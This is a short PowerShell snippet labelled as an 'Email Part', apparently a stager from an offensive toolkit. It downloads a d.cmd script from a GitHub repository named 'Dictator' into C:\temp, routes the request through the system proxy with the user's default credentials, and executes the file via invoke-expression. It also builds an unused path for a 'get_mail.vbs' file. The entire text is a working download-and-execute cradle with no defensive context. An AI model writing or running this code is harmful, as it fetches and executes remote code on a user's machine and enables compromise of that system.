#Email Part
$path_vb_ms = [System.IO.Path]::GetTempPath()
$path_vb_ms=$path_vb_ms+"get_mail.vbs"
$my_path="C:\temp\d.cmd"
$url='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/d.cmd';
$b=new-object net.webclient;
$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$b.DownloadFile($url, $my_path) ;
$command = "cmd /C "+$my_path
invoke-expression $command
